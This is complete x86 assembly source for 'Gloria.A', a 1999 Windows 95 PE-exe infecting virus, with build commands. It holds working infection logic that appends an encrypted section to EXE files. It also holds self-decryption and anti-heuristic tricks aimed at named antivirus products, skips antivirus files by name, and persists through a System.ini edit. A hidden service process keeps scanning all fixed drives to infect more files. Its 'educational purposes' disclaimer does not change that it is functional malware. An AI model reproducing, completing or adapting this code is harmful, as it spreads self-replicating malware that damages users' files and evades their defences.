   ;
   ; Virus:          Gloria.A
   ; Size:           3440 bytes
   ; Author:         N.B.K.   <"nbk@programador.mailbr.com.br">
   ;
   ;
   ;
   ;       This is a direct action Pe-exe infector. Will infect files
   ; under Windows 95 (I don't know if works on NT or Win 2000)
   ; with extension *.EXE. After running, will modifie System.ini
   ; in Windows directory and Install a server that scans for
   ; files in all fixed disks.
   ;
   ; Greetz:
   ;
   ; Lord Julus ( good work in virus list )
   ; Vecna ( Thanx for help me )
   ;
   ;       And all Vx writer in "#vir" / "#virus" channels.
   ;
   ;       This code is only for educational purposes.
   ; Don't assembly it !!!.
   ;
   ;
   ; Know bugs:     - Error with Winzip self-extract files
   ;
   ;       [ This is my first virus :-) ].
   ;
   ;
   ; tasm32 -ml -m gloria.asm
   ; tlink32 -Tpe -aa -c gloria,,,import32.lib
   ; pewrsec gloria.exe


                   .386p
                   .model flat, stdcall
                   locals
                   jumps

                   include my_own.inc

   Gloria:     pushad
           xor ebx,ebx
           db 68h
   replace_heur    dd ofs anti_heuristic
                   push dword ptr fs:[ebx]
                   mov dword ptr fs:[ebx],esp

           ; Generate exception, but we can handle it...

           int 03h

           db 0E9h

           ; F-PROT will jump "here"
           ; And AVP stop scanning when saw that this
           ; is the first section, named .CODE  :-)

           ; restore errors

   anti_heuristic: mov esp,dword ptr [esp+8]
                   xor ebx,ebx
                   pop dword ptr fs:[ebx]
           add esp,4

           ; edi = offset for encrypted code

           db 0BFh
   replace_addr    dd ofs dummy

           ; code lenght

           mov ecx,virus_crypt

   loop_decrypt:   mov eax,dword ptr [edi]
           ror eax,1
           sub eax,19h
           rol eax,2
           add eax,11h
           ror eax,2
           inc eax
           rol eax,1

           xor eax,96291273h
   key_dword2  equ $ - 4

           not eax
           mov dword ptr [edi],eax
           add edi,4

           loop loop_decrypt

           ; get delta offset

   area_crypt: call getdelta

   getdelta:   pop ebp
           sub ebp,ofs getdelta

           ; try windows 95 kernel

           mov eax,0BFF70000h

           cmp word ptr [eax],"ZM"
           je krnl_found

           ; try windows NT kernel

           mov eax,077F00000h

           cmp word ptr [eax],"ZM"
           je krnl_found

           ; try windows 2000 kernel (Thanx Vecna)

           mov eax,077e00000h

           cmp word ptr [eax],"ZM"
           jne unknow_os

   krnl_found: mov [ebp+ofs kernel32],eax
           lea edx,[ebp+ ofs getprocaddress]

           ; retrieve GetProcAddress (engine from Lord Julus)

           call my_GetProc
           jc unknow_os

           ; locate api address

           mov dword ptr [ebp+GetProc],eax
           call locate_api

           lea esi,[ebp+ofs key_dword]
           dec dword ptr [esi]

           ; get a random number

           in al,40h
           mov cl,al

           ; rotate new key

           mov ebx,dword ptr [esi]
           ror ebx,cl

           ; and fix it

           mov dword ptr [esi],ebx
           mov dword ptr [ebp+key_dword2],ebx

           call dword ptr [ebp+GetCommandLineA]
           mov ecx,512

           ; We need  to stay in net mode ?

   _scan:      cmp dword ptr [eax],"bteN"
           je net_mode

           inc eax
           loop _scan

           ; restore values used to back to host

           call reset_var

           lea eax,[ebp+ofs path_name]
                   push eax
                   push 260
                   call dword ptr [ebp+GetCurrentDirectoryA]

           xor al,al
           mov byte ptr [ebp+files_infect],al

           ; infect current directory

           call infect_one

           ; Install checker

           call check_install_net

           ; exit virus code

           jmp Gloria_exit

   infect_one: pushad

               lea esi,[ebp+ofs path_name]
           lea edi,[ebp+ofs stringexe]

           ; insert \*.EXE to path

           cld
   _@@2:       lodsb
           or al,al
           jnz _@@2

           sub esi,1
           xchg esi,edi

           movsd
           movsd

           lea eax,[ebp+ofs file_data]
                   lea esi,[ebp+ofs path_name]
               push eax esi
                   call dword ptr [ebp+FindFirstFileA]

                   mov dword ptr [ebp+handle_find],eax
                   cmp eax,-1
                   je ret_infect_loop

           xor ecx,ecx

           lea edi,[ebp+ofs file_data.FileName]
   _@@3:       lodsb
           inc ecx
           or al,al
           jnz _@@3

           ; subtract *.EXE,0 string

           sub esi,6
           xchg esi,edi

           ; add filename to path

           mov ecx,260
           rep movsb

           jmp infect_loop@

   infect_loop:    lea esi,[ebp+ofs path_name]
   _@1@:       lodsb
           or al,al
           jnz _@1@

           ; find last "\"

           std
   _@2@:       lodsb
           cmp al,"\"
           jne _@2@
           cld
           add esi,2

           lea edi,[ebp+ofs file_data.FileName]
           xchg esi,edi

           ; And replace filename

           mov ecx,260
           rep movsb

   infect_loop@:   lea esi,[ebp+ofs path_name]

   _@_1:       lodsb
           or al,al
           jnz _@_1

           ; set direction flag to go back to "\"

           std
   _@_2:       lodsb
           cmp al,"\"
           jne _@_2

           ; clear direction flag to avoid future errors

           cld
           add esi,2

           mov edi,esi

           ; check file name

           call chk_fl_name
           jc check_how

           push 80h
           push esi
           call dword ptr [ebp+SetFileAttributesA]

           mov eax,dword ptr [ebp+ofs file_data.FileSizeLow]
           mov dword ptr [ebp+new_file_size],eax
           mov dword ptr [ebp+old_file_size],eax

           cmp eax,1000h
           ja good_size

           jmp attr_res

   good_size:  call open_mapp
           or eax,eax
           jz attr_res

           ; check PE header

           call check_cod
           jc unmap_attr

           ; close file

   good_entry: call unmap
           add dword ptr [ebp+new_file_size],(vir_size*2)

           ; open with virus size * 2

           call open_mapp
           or eax,eax
           jz attr_res

           ; call infection routine

           call process_file

           mov eax,dword ptr [ebp+physicalsize]
           sub dword ptr [ebp+new_file_size],(vir_size*2)
           add dword ptr [ebp+new_file_size],(vir_size+200h)

           ; mark this infection

                   inc byte ptr [ebp+files_infect]

           ; Unmap it

   unmap_attr: call unmap

   attr_res:   push dword ptr [ebp+ ofs file_data.FileAttributes]
           lea eax,[ebp+ofs path_name]
           push eax
           call dword ptr [ebp+SetFileAttributesA]

   check_how:  cmp byte ptr [ebp+files_infect],0Ah
                   jae close_find

   find_next_file: lea eax,[ebp+ ofs file_data]
                   push eax
                   mov eax,[ebp+handle_find]
           push eax
                   call dword ptr [ebp+FindNextFileA]

                   or eax,eax
                   jz close_find

                   jmp infect_loop

           db 0B8h     ; The next call will never be found.

   close_find:     push dword ptr [ebp+handle_find]
                   call dword ptr [ebp+FindClose]
   ret_infect_loop:popad
           ret

   process_file:
           ; infection routine
           ; put new section named ".CODE"
           ; as first section

           pushad
                   mov esi,dword ptr [ebp+mem_addr]
                   add dword ptr [ebp+peofs],esi

                   mov edi,dword ptr [ebp+peofs]

                   xor ebx,ebx
                   mov bx,word ptr [edi._nt]
                   add ebx,18h
                   add ebx,edi
                   mov dword ptr [ebp+tableofs],ebx

                   xor eax,eax
                   mov ax,word ptr [edi._objects]
           inc word ptr [edi._objects]     ; add 1 object

                   mov ecx,40
                   xor edx,edx
                   mul ecx

           mov dword ptr [ebp+all_sec_size],eax
                   add eax,dword ptr [ebp+tableofs]
                   mov dword ptr [ebp+lastsection],eax

                   xor al,al
           in al,41h
           shr al,1
           inc al

                   mov esi,dword ptr [ebp+mem_addr]
                   mov byte ptr [esi+12h],al ; mark infection

                   ; Save usefull values

                   mov eax,dword ptr [edi._entry]
                   mov dword ptr [ebp+old_value_rva],eax

                   mov eax,dword ptr [edi._image_base]
                   mov dword ptr [ebp+old_imagebase],eax

                   mov eax,dword ptr [edi._obj_ln]
                   mov dword ptr [ebp+objalign],eax

                   mov eax,dword ptr [edi._file_ln]
                   mov dword ptr [ebp+filealign],eax

                   mov eax,dword ptr [ebp+lastsection]
           mov edi,eax

           mov eax, [edi-5*8+8]
           add eax, [edi-5*8+12]
           mov ecx,dword ptr [ebp+objalign]
           call align_proc

           mov esi,dword ptr [ebp+lastsection]
           mov [esi._RVA],eax
           mov [ebp+virus_entry],eax

           mov ecx,dword ptr [ebp+filealign]
           mov eax,vir_size
           call align_proc
           mov dword ptr [esi._physical_sz],eax        ; physical size
           mov dword ptr [ebp+physicalsize],eax        ; physical size

           mov ecx,dword ptr [ebp+objalign]
           mov eax,virtual_size_gl
           call align_proc
           mov dword ptr [esi._virtual_sz],eax     ; virtual size

           mov eax,[edi-5*8+20]
           add eax,[edi-5*8+16]
           mov ecx,dword ptr [ebp+filealign]
           call align_proc
           mov [esi._physical_off],eax
                   add eax,dword ptr [ebp+mem_addr]
           mov dword ptr [ebp+_real_ofs],eax

           ; store new section named ".CODE"

                   mov dword ptr [edi._obj_flags],0C0000080h   ; flags
                   lea edi,[edi._name_sec]
           lea esi,[ebp+my_section]
           mov ecx,8
           rep movsb

           mov esi,dword ptr [ebp+peofs]
           mov eax,virtual_size_gl
           add eax,dword ptr [esi._img_sz]
           mov ecx,dword ptr [ebp+objalign]
           call align_proc
           mov dword ptr [esi._img_sz],eax

           mov eax,dword ptr [ebp+virus_entry]
           mov [esi._entry],eax

           ; copy sections to my buffer

           lea edi,[ebp+ofs section_space]
           mov esi,dword ptr [ebp+tableofs]
           mov ecx,dword ptr [ebp+all_sec_size]
           rep movsb

           ; replace the first section

           mov esi,dword ptr [ebp+lastsection]
           mov edi,dword ptr [ebp+tableofs]
           mov ecx,28h
           rep movsb

           ; and copy the rest

           lea esi,[ebp+section_space]
           mov edi,dword ptr [ebp+tableofs]
           add edi,28h
           mov ecx,dword ptr [ebp+all_sec_size]
           rep movsb

           ; calculate new offsets

           mov edi,dword ptr [ebp+virus_entry]
           push edi
           add edi,[ebp+ofs old_imagebase]
           add edi,ofs area_crypt - ofs Gloria
           mov [ebp+ofs replace_addr],edi

           pop edi
           add edi,[ebp+ofs old_imagebase]

           add edi,ofs anti_heuristic - ofs Gloria
           mov [ebp+ofs replace_heur],edi

           ; And copy our virus to file

                   mov edi,dword ptr [ebp+_real_ofs]
                   lea esi,[ebp+ofs Gloria]
           mov ecx,entry_fim - Gloria
           rep movsb

           mov ecx,virus_crypt
           mov edi,dword ptr [ebp+_real_ofs]
           add edi,ofs area_crypt - ofs Gloria

           ; encrypt code

   loop_encrypt:   mov eax,dword ptr [edi]
           not eax
           xor eax,96291273h
   key_dword   equ $ - 4
           ror eax,1
           dec eax
           rol eax,2
           sub eax,11h
           ror eax,2
           add eax,19h
           rol eax,1
           mov dword ptr [edi],eax
           add edi,4
           loop loop_encrypt

                   popad
           ret


   align_proc:     xor edx,edx
                   div ecx
                   inc eax
                   mul ecx
                   ret
   map_view:       push ecx        ; file size
                   push 0
                   push 0
                   push 2
                   push dword ptr [ebp+handle_mapping]
                   call dword ptr [ebp+MapViewOfFile]
                   ret
   create_mapp:    push 0
                   push eax        ; file size
                   push 0
                   push 4
                   push 0
                   push dword ptr [ebp+handle_new_file]
                   call dword ptr [ebp+CreateFileMappingA]
                   ret
   unmap_file:     push dword ptr [ebp+mem_addr]
                   call dword ptr [ebp+UnmapViewOfFile]
   close_map_hnd:  push dword ptr [ebp+handle_mapping]
                   call dword ptr [ebp+CloseHandle]
   close_cre_hnd:  push dword ptr [ebp+handle_new_file]
                   call dword ptr [ebp+CloseHandle]
                   xor eax,eax
                   ret

   ;************************************************************
   ;                               *
   ;             FROM LORD JULUS (c)           *
   ;                               *
   ;************************************************************

   my_GetProc:
           pushad                                      ;
                   mov ebx, eax                                ; save the kernel base
                   mov edi, eax                                ;
                   cmp word ptr [edi], 'ZM'                    ; is it an exe?
                   jne notfoundgpa                             ;
                                                               ;
                   mov edi, dword ptr [edi.MZ_lfanew]          ;
                   cmp edi, 1000h                              ;
                   jae notfoundgpa                             ;
                                                               ;
                   add edi, ebx                                ;
                   cmp word ptr [edi], 'EP'                    ; is it a PE?
                   jne notfoundgpa                             ;
                                                               ;
                   add edi, IMAGE_FILE_HEADER_SIZE             ; skip file header
                                                               ;
                   mov edi, dword ptr [edi.OH_DataDirectory.DE_Export.DD_VirtualAddress]
                   add edi, ebx                                ; and get export RVA
                                                               ;
                   mov ecx, dword ptr [edi.ED_NumberOfNames]   ; save number of names
                                                               ; to look into
                   mov esi, dword ptr [edi.ED_AddressOfNames]  ; get address of names
                   add esi, ebx                                ; align to base rva
                                                               ;
                   push edi                                    ; save pointer to export
                                                               ;
   gpa_locate_loop:                                            ;
                   mov edi, [esi]                              ; get one name address
                   add edi, ebx                                ; and align it
                                                               ;
                   push ecx esi                                ; save counter and addr.
                                                               ;
                   mov esi, edx                                ; compare to GetProcAddress
                   mov ecx, getprocaddresslen                  ;
                   rep cmpsb                                   ;
                   je foundgpa                                 ;
                                                               ;
                   pop esi ecx                                 ; restore them
                                                               ;
                   add esi, 4                                  ; and get next name
                   loop gpa_locate_loop                        ;
                                                               ;
   notfoundgpa:                                       ; we didn't find it...
                   pop edi                                     ;
                   popad                                       ;
                   xor eax, eax                                ; mark failure
                   stc                                         ;
                   ret                                         ;
                                                               ;
   foundgpa:                                                   ;
                   pop esi ecx                                 ; ecx = how many did we
                   pop edi                                     ; check from total, but
                   sub ecx, dword ptr [edi.ED_NumberOfNames]   ; we need the reminder
                   neg ecx                                     ; of the search
                   mov eax, dword ptr [edi.ED_AddressOfOrdinals]; get address of ordinals
                   add eax, ebx                                ;
                   shl ecx, 1                                  ; and look using the index
                   add eax, ecx                                ;
                   xor ecx, ecx                                ;
                   mov cx, word ptr [eax]                      ; take the ordinal
                   mov eax, dword ptr [edi.ED_AddressOfFunctions]; take address of funcs.
                   add eax, ebx                                ;
                   shl ecx, 2                                  ; we look in a dword array
                   add eax, ecx                                ; go to the function addr
                   mov eax, [eax]                              ; take it's address
                   add eax, ebx                                ; and align it to k32 base
                   mov dr0, eax                                ; save it in dr0
                   popad                                       ; restore all regs
                   mov eax, dr0                                ; and mark success
                   clc                                         ;
                   ret                                         ;

   check_install_net:

           ; Install Netbstat.exe in Windows directory and
           ; modify system.ini to execute at the next reboot.

           pushad

           call dword ptr [ebp+GetCommandLineA]
           mov esi,eax
           lea edi,[ebp+ofs cmd_line]
           mov ecx,208h
           rep movsb

           lea esi,[ebp+ofs path_name]
           push 260
           push esi
           call dword ptr [ebp+GetWindowsDirectoryA]

           or eax,eax
           jz file_in_use

           lea edi,[ebp+ofs path_name@@]
           mov ecx,260
           rep movsb

           lea esi,[ebp+ofs path_name@@]
   _@13@:      lodsb
           or al,al
           jnz _@13@

           ; insert "\",00h in the path

           mov word ptr [esi-1],005Ch

           ; point edi for System.ini string

           lea edi,[ebp+Netbstat]
           xchg esi,edi

           ; And add to path

           mov ecx,0Dh
           rep movsb

           lea esi,[ebp+ofs path_name]
   _@1@@:      lodsb
           or al,al
           jnz _@1@@

           ; insert "\",00h in the path

           mov word ptr [esi-1],005Ch

           ; point edi for System.ini string

           lea edi,[ebp+System_ini]
           xchg esi,edi

           ; And add to path

           mov ecx,0Bh
           rep movsb

           ; Process our command Line

           call dword ptr [ebp+GetCommandLineA]

           inc eax
           xor ecx,ecx
   check_char: cmp byte ptr [eax],22h
           je replace_char
           inc ecx
           inc eax
           jmp check_char

   replace_char:   mov byte ptr [eax],00h
           sub eax,ecx

           mov esi,eax
           lea edi,[ebp+ofs from_line]
           mov ecx,260
           rep movsb

           ; Try to overwrite our server if isn't running

           xor ebx,ebx
           push ebx
           lea eax,[ebp+ofs path_name@@]
           push eax
           lea eax,[ebp+ofs from_line]
           push eax
           call dword ptr [ebp+CopyFileA]

           or eax,eax
           jz file_in_use

           ; server isn't installed

           lea eax,[ebp+ ofs file_data]
                   push eax
                   lea eax,[ebp+ ofs path_name]
               push eax
                   call dword ptr [ebp+FindFirstFileA]
                   mov dword ptr [ebp+handle_find],eax

                   cmp eax,-1
                   je file_in_use

           ; Save "System.ini" size

           mov eax,dword ptr [ebp+ofs file_data.FileSizeLow]
           mov dword ptr [ebp+new_file_size],eax

           ; open and map "System.ini"

           call open_mapp
           or eax,eax
           jz clsfind

           ; Bigger than our buffer ?

           cmp dword ptr [ebp+new_file_size],1000h
           ja unmap_sys

           ; Look for "hell = Explorer.exe"

   _@1:        cmp dword ptr [eax],"lleh"
           je _@2
           inc eax
           jmp _@1

           ; add string path "hell = Explorer.exe" to eax

   _@2:        add eax,11h

           ; If string = space, then System.ini
           ; is already infected

           cmp byte ptr [eax],20h
           je unmap_sys

           ; Save this address for later use

           mov dword ptr [ebp+addr_sys],eax
           mov esi,eax

           ; Copy System.ini to our buffer

           lea edi,[ebp+section_space]
           mov ecx,dword ptr [ebp+new_file_size]
           rep movsb

           mov edi,eax

           ; Point esi to our string

           lea esi,[ebp+ofs Net_sign]
           mov ecx,0Dh
           rep movsb

           ; Unmap with old file size

           call unmap
           add dword ptr [ebp+new_file_size],0Dh

           ; And re-map with new

           call open_mapp

           ; Don't forget to copy last bytes

           mov edi,dword ptr [ebp+addr_sys]
           add edi,0Dh
           lea esi,[ebp+section_space]
           mov ecx,dword ptr [ebp+new_file_size]
           rep movsb

           ; Close search handle and unmap file

   unmap_sys:  call unmap
   clsfind:    push dword ptr [ebp+handle_find]
                   call dword ptr [ebp+FindClose]
   file_in_use:    call dword ptr [ebp+GetCommandLineA]
           mov edi,eax
           lea esi,[ebp+ofs cmd_line]
           mov ecx,208h
           rep movsb
           popad
           ret

   reset_var:  ; clear direction flag to avoid errors
           ; And copy old keys to return buffer

           cld
           lea esi,[ebp+ofs old_value_rva]
                   lea edi,[ebp+ofs new_value_rva]
                   movsd
                   movsd
           ret


   open_mapp:  ; Open and Map file in memory. Returns eax = 0 on error or
           ; Mapped address if success

           ; Try don't show our encryption
           ; key putting many zeros in code

           xor eax,eax
           push eax
                   push eax
                   push 3
                   push eax
                   push 1
                   push 80000000h or 40000000h
           lea eax,[ebp+ofs path_name]
                   push eax
                   call dword ptr [ebp+CreateFileA]

                   mov dword ptr [ebp+handle_new_file],eax
                   cmp eax,-1
                   je error_bef_create

           xor eax,eax
           push eax
                   push dword ptr [ebp+new_file_size]   ; file size
                   push eax
                   push 4
                   push eax
                   push dword ptr [ebp+handle_new_file]
                   call dword ptr [ebp+CreateFileMappingA]

                   mov dword ptr [ebp+handle_mapping],eax
                   or eax,eax
                   jz error_aft_create

           xor eax,eax
           push dword ptr [ebp+new_file_size]  ; file size
                   push eax
                   push eax
                   push 2
                   push dword ptr [ebp+handle_mapping]
                   call dword ptr [ebp+MapViewOfFile]

                   mov dword ptr [ebp+mem_addr],eax
                   or eax,eax
                   jz close_bef_mappin
           ret

   unmap:      push dword ptr [ebp+mem_addr]
                   call dword ptr [ebp+UnmapViewOfFile]
                   push dword ptr [ebp+handle_mapping]
                   call dword ptr [ebp+CloseHandle]

   close_bef_mappin:
           push dword ptr [ebp+handle_mapping]
                   call dword ptr [ebp+CloseHandle]

           xor eax,eax
           push eax
           push eax
           push dword ptr [ebp+offset new_file_size]
           push dword ptr [ebp+handle_new_file]
           call dword ptr [ebp+SetFilePointer]

           push dword ptr [ebp+handle_new_file]
           call dword ptr [ebp+SetEndOfFile]

   error_aft_create:
           push dword ptr [ebp+handle_new_file]
                   call dword ptr [ebp+CloseHandle]

   error_bef_create:
           xor eax,eax
           ret

   locate_api: ; retrieve api's from Kernel32.dll

           lea esi,[ebp+ ofs api_name]
                   lea edi,[ebp+ ofs api_addr]

           ; push api name

   locate_again:   push esi
                   push dword ptr [ebp+ofs kernel32]
                   call dword ptr [ebp+GetProc]
                   or eax,eax
                   jz Gloria_exit
                   stosd

   look_4_name:    inc esi
                   cmp byte ptr [esi],00h
                   jne look_4_name
                   inc esi
                   cmp byte ptr [esi],0FFh
                   jne locate_again
           ret

   chk_fl_name:    pushad
           ; Process file name
           ; avoid anti-virus infection

           cmp edi,"DNAP"                ; PAND*.*
           je @7@@
           cmp edi,"_SSC"                ; CSS_*.*
           je @7@@
           cmp edi,"NACS"                ; SCAN*.*
           je @7@@
           cmp di,"-F"           ; F-*.*
           je @7@@

           ; avoid to infect files with "V" in the name

           xor al,al
           mov al,"V"
           mov ecx,0Ah
           repne scasb
           je @7@@

           sub edi,0Ah

           add al,20h
           mov ecx,0Ah
           repne scasb
           je @7@@

           popad
           clc
           ret
   @7@@:       popad
           stc
           ret

   check_cod:  pushad

                   mov esi,dword ptr [ebp+mem_addr]
                   xor al,al
                   mov al,byte ptr [esi+12h]

           ; check infectin mark

                   or al,al
                   jnz s@@2

           ; Windows application

           cmp byte ptr [esi+18h],40h
           jb s@@2

           ; clean file

           mov edi,dword ptr [esi+3Ch]
                   mov dword ptr [ebp+peofs],edi

   ;       ; avoid errors in files
   ;       ; like Wininit.exe
   ;
   ;       cmp edi,1000h
   ;       jae s@@2

           ; check if is PE-exe

                   add edi,esi
                   mov ax,word ptr [edi]
           cmp ax,"EP"
                   jne s@@2

           ; check if .petite section was found
           ; if yes, quit from infection

           mov eax,"tep."
           mov ecx,258h
           repne scasd
           je s@@2

           popad
           clc
           ret
   s@@2:       popad
           stc
           ret


           ; Scan *.EXE files in directories and sub.
           ; Look for all fixed disks  (A - Z)
           ; Register as a service process

   net_mode:   push 1
           xor eax,eax
           push eax
           call dword ptr [ebp+RegisterServiceProcess]

           ; Wait one minute

           push one_minute
           call dword ptr [ebp+Sleep]

           lea ebx,[ebp+ ofs drives]

           ; start with "A:\"

           mov byte ptr [ebx],"A"

   more_drives:    lea ebx,[ebp+ ofs drives]
           push ebx
           call dword ptr [ebp+GetDriveTypeA]

           cmp eax,3
           jne inc_drives

           lea eax,[ebp+ofs drives]
           push eax
           call dword ptr [ebp+SetCurrentDirectoryA]

           ; Find directories

           call check__drv

           push one_minute
           call dword ptr [ebp+Sleep]

   inc_drives: inc byte ptr [ebp+drives]

           ; No more drives ?
           ; Then start again

           cmp byte ptr [ebp+drives],05Bh
           jae net_mode

           jmp more_drives



           ; Look for directories and infect ten
           ; files.

   check__drv: lea eax,[ebp+ofs _barra]
           push eax
           call dword ptr [ebp+SetCurrentDirectoryA]

           lea eax,[ebp+ ofs file_data]
           push eax
           lea eax,[ebp+ ofs stringdir]
           push eax
           call dword ptr [ebp+FindFirstFileA]
           mov [ebp+handle_dir1],eax

           inc eax
           jz _check_ret
           dec eax

           ; check directory attributes
           ; can be 10h,11h,12h or 13h

   check_dir_ok:   mov eax,dword ptr [ebp+file_data.FileAttributes]
           mov ebx,10h
           mov ecx,4
   check_attr_dir: cmp eax,ebx
           je attr_dir_ok
           inc ebx
           loop check_attr_dir

           jmp find_a
   attr_dir_ok:    lea eax,[ebp+ofs file_data.FileName]
           cmp byte ptr [eax],"."
           je find_a

           ; copy directory to path

           mov esi,eax
           lea edi,[ebp+ofs path_name]
           mov ecx,260
           rep movsb

           xor al,al
           mov byte ptr [ebp+files_infect],al

           ; here path name is the same as
           ; directory name

           ; and infect ten files

           call infect_one

           ; At this point path name is
           ; the directory plus file name
           ; or the string *.EXE,0

           lea edi,[ebp+ofs path_name]
           mov ecx,260
           rep stosb

           ; find next directory

   find_a:     lea eax,[ebp+ ofs file_data]
           push eax
           push dword ptr [ebp+handle_dir1]
           call dword ptr [ebp+FindNextFileA]
           or eax,eax
           jnz check_dir_ok

           push dword ptr [ebp+handle_dir1]
           call dword ptr [ebp+FindClose]

   _check_ret: ret


   Gloria_exit:    or ebp,ebp
                   jz _saida

   exit_nt:        mov eax,[ebp+ofs new_value_rva]
                   add eax,[ebp+ofs new_imagebase]
                   lea ebx,[ebp+ofs jump + 4]
                   sub eax,ebx
                   mov dword ptr [ebp+jump],eax
           popad
                   db 0E9h
   jump            dd 00h

   old_value_rva   dd 00h
   old_imagebase   dd 00h
   new_value_rva   dd 00h
   new_imagebase   dd 00h

           db 0B8h     ; Confuse disassembler
   unknow_os:  call reset_var
           jmp short exit_nt

   _saida:     call MessageBoxA,0,ofs $,ofs $,1000h

           popad

           xor eax,eax
           push eax
           call ExitProcess

   my_section  db ".CODE",0,0,0
   stringexe       db "\*.EXE",0
   stringdir       db "*.*",0

   drives      db "A:\",00h

   Net_sign    db " Netbstat.exe"
   System_ini  db "System.ini",0
   Netbstat    db "Netbstat.exe",0
   _barra      db "\",0
   kernel32    dd 12345678h

   getprocaddress  db "GetProcAddress", 0
   getprocaddresslen = $-ofs getprocaddress

   api_name:
   xFindFirstFileA  db "FindFirstFileA",0
   xFindNextFileA   db "FindNextFileA",0
   xDeleteFileA     db "DeleteFileA",0
   xGetFileSize     db "GetFileSize",0
   xSetFileAttributesA    db "SetFileAttributesA",0
   xGetCurrentDirectoryA  db "GetCurrentDirectoryA",0
   xCreateFileMappingA    db "CreateFileMappingA",0
   xMapViewOfFile   db "MapViewOfFile",00h
   xUnmapViewOfFile db "UnmapViewOfFile",00h
   xCreateFileA     db "CreateFileA",00h
   xWinExec         db "WinExec",00h
   xCloseHandle     db "CloseHandle",00h
   xFindClose       db "FindClose",00h
   xGetDriveTypeA   db "GetDriveTypeA",00h
   xCopyFileA       db "CopyFileA",00h
   xSleep       db "Sleep",00h
   xSetCurrentDirectoryA db "SetCurrentDirectoryA",00h
   xGetWindowsDirectoryA db "GetWindowsDirectoryA",00h
   xGetFileAttributes    db "GetFileAttributesA",00h
   xGetCommandLineA      db "GetCommandLineA",00h
   xRegisterServiceProcess db "RegisterServiceProcess",00h
   xSetFilePointer db "SetFilePointer",00h
   xSetEndOfFile   db "SetEndOfFile",00h
           db 0FFh



           db "   Virus   Gloria.A    "
           db "  For my sweet Gloria  "
           db "     Brazil - 1999     "
           db "     (c) N.B.K.    "




           align 4

   vir_size    equ $ - Gloria
   entry_fim   equ $

   path_name       db 105h dup (00h)         ; 261 bytes long
   path_name@@ db 105h dup (00h)     ; 261 bytes long
   from_line   db 208h dup (00h)     ; 520 bytes long
   file_data       win32_find_data <?>       ; 318 bytes long
   handle_dir1 dd 00h
   handle_dir2 dd 00h

   handle_new_file dd 00h
   handle_old_file dd 00h
   handle_mapping  dd 00h
   handle_find     dd 00h
   new_file_size   dd 00h
   old_file_size   dd 00h

   mem_addr        dd 00h
   peofs           dd 00h
   tableofs    dd 00h
   lastsection     dd 00h
   junk_ofs    dd 00h
   addr_sys    dd 00h
   objalign        dd 00h
   filealign       dd 00h

   _real_ofs       dd 00h
   virtualsize     dd 00h
   physicalsize    dd 00h
   virus_entry dd 00h

   files_infect    db 00h
   GetProc         dd 00h
   file_attr   dd 00h
   all_sec_size    dd 00h

   api_addr:

   FindFirstFileA  dd 00h
   FindNextFileA   dd 00h
   DeleteFileA     dd 00h
   GetFileSize     dd 00h
   SetFileAttributesA    dd 00h
   GetCurrentDirectoryA  dd 00h
   CreateFileMappingA    dd 00h
   MapViewOfFile   dd 00h
   UnmapViewOfFile dd 00h
   CreateFileA     dd 00h
   WinExec         dd 00h
   CloseHandle     dd 00h
   FindClose       dd 00h
   GetDriveTypeA   dd 00h
   CopyFileA   dd 00h
   Sleep       dd 00h
   SetCurrentDirectoryA  dd 00h
   GetWindowsDirectoryA  dd 00h
   GetFileAttributesA    dd 00h
   GetCommandLineA       dd 00h
   RegisterServiceProcess dd 00h
   SetFilePointer  dd 00h
   SetEndOfFile    dd 00h

   section_space   db 1000h dup (00h)      ; place for sections
   cmd_line    db 208h dup (00h)       ; place for command line

   virtual_size_gl equ $ - Gloria
   Gloria_end      equ $

   end             Gloria
